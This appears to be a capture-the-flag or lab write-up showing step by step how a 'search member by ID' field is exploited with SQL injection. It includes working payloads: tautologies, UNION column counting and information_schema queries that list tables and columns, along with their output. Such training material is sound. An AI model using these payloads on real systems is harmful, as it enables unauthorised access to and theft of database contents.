### Title: <span style="color:blue">SQL Injection Vulnerability in Members Input Field</span>

**Location:** `page=member`

**Step 1:** try to write any basic SQL SELECT Statement in members input field as it is vulnerable to SQL injection

**Result:**

```sql
You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'select \*' at line 1
```

**Step 2 :**
we write to the search field `74 or 1=1` or `74 or 1=1--` we can replace 74 by any other random id.
the input have a label:` SEARCH MEMBER BY ID` so the original query may be something similar to :

```sql
SELECT <column_name1>, <column_name2> FROM <table_name> WHERE ID = "id_number"

```

the injected query `74 or 1=1-- ` is typically combined with the original query by the application's backend code before being sent to the database for execution. so the resulted query is something like

```sql
 SELECT <column_name1>, <column_name2> FROM <table_name> WHERE ID = 74 or 1=1
```

In this case, the injected part '74 OR 1=1--' causes the query to return all rows from the users table because '1=1' is always true. If 'id=74' is not found, all the rows will be returned as 'OR 1=1' allows this to happen. The '--' at the end is used to comment out the rest of the original query to avoid syntax errors (it's not necessary to use the hyphens).
**Result:**

```sql
 result
 ID: 74 or 1=1
 First name: one
 Surname : me
```

> [!NOTE]
> the result show that the original select statement, query over two columns and this is a very important information to use in the sql query injection.

**Step 3 :**

In SQL injection attacks, knowing the number of columns in a SQL query can be important for constructing a SQL statement that doesn't break the syntax or structure of the original query. Additionally, if we want to use the UNION clause to combine other queries into the original, this condition should be fulfilled: Every SELECT statement within UNION must have the same number of columns.
We can use the `union-based` SQL injection technique to select more and more null values until the query is correct.
The UNION operator is used to combine the result sets of two or more SELECT statements.

```sql

SELECT _column_name(s)_ FROM _table1_ UNION SELECT _column_name(s)_ FROM _table2_;
Every SELECT statement within UNION must have the same number of columns.
The columns must also have similar data types.
The columns in every SELECT statement must also be in the same order. Syntax example:

```

```sql

74 or 1=1 UNION SELECT null; -- The used SELECT statements have a different number of columns.
74 or 1=1 UNION SELECT null,null; -- This works.
74 or 1=1 UNION SELECT null,null,null; -- The used SELECT statements have a different number of columns.
```

**Step 3 :** use the information_schema database

`INFORMATION_SCHEMA` is a database within each MySQL instance, the place that stores information about all the other databases, contains several read-only tables, and not perform INSERT, UPDATE, or DELETE operations on them.
You can use queries against the information_schema database to retrieve information about the database server, such as:

- Listing databases and their properties (SCHEMATA table).
- Listing tables in a database (TABLES table).
- Listing columns in a table (COLUMNS table).
- Listing indexes in a table (STATISTICS table).
- Listing privileges that users have (SCHEMA_PRIVILEGES, TABLE_PRIVILEGES, COLUMN_PRIVILEGES tables).

```sql
74 or 1=1 union select TABLE_NAME, TABLE_TYPE from INFORMATION_SCHEMA.tables

```

```sql
ID: 74 or 1=1 union select TABLE_NAME, TABLE_TYPE from INFORMATION_SCHEMA.tables
First name: db_default
Surname : BASE TABLE

ID: 74 or 1=1 union select TABLE_NAME, TABLE_TYPE from INFORMATION_SCHEMA.tables
First name: users
Surname : BASE TABLE

ID: 74 or 1=1 union select TABLE_NAME, TABLE_TYPE from INFORMATION_SCHEMA.tables
First name: guestbook
Surname : BASE TABLE

ID: 74 or 1=1 union select TABLE_NAME, TABLE_TYPE from INFORMATION_SCHEMA.tables
First name: list_images
Surname : BASE TABLE

ID: 74 or 1=1 union select TABLE_NAME, TABLE_TYPE from INFORMATION_SCHEMA.tables
First name: vote_dbs
Surname : BASE TABLE

```

the value BASE TABLE in the TABLE_TYPE column indicates that the table is a regular, user-created table (i.e., not a view or a system table).

```sql
 74 or 1=1 union select TABLE_NAME, COLUMN_NAME From INFORMATION_SCHEMA.COLUMNS
```

**Resources:**

information_shema: https://dev.mysql.com/doc/mysql-infoschema-excerpt/8.3/en/information-schema-introduction.html

MySQL Injection: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md
https://book.hacktricks.xyz/pentesting-web/sql-injection/mysql-injection
